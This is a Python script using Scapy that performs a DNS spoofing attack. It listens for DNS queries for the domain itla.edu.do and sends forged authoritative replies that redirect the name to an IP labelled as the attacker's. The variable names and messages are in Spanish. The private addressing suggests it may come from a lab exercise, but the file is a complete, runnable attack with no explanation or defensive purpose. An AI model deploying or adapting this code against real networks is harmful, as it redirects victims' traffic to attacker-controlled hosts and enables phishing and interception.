from scapy.all import *

IFACE    = "ens3.10"
ATACANTE = "10.7.2.151"
OBJETIVO = "itla.edu.do"

def spoof_dns(pkt):
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return
    if not pkt.haslayer(IP):
        return

    qname = pkt[DNS].qd.qname.decode()
    if OBJETIVO not in qname:
        return

    print(f"[+] Interceptado: {qname} desde {pkt[IP].src}")

    respuesta = (
        Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) /
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        UDP(sport=53, dport=pkt[UDP].sport) /
        DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            rd=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,
                ttl=10,
                rdata=ATACANTE
            )
        )
    )

    sendp(respuesta, iface=IFACE, verbose=False)
    print(f"[+] Respuesta falsa enviada: {OBJETIVO} → {ATACANTE}")

print(f"[*] Escuchando consultas DNS en {IFACE}...")
sniff(iface=IFACE, filter="udp port 53", prn=spoof_dns, store=0)
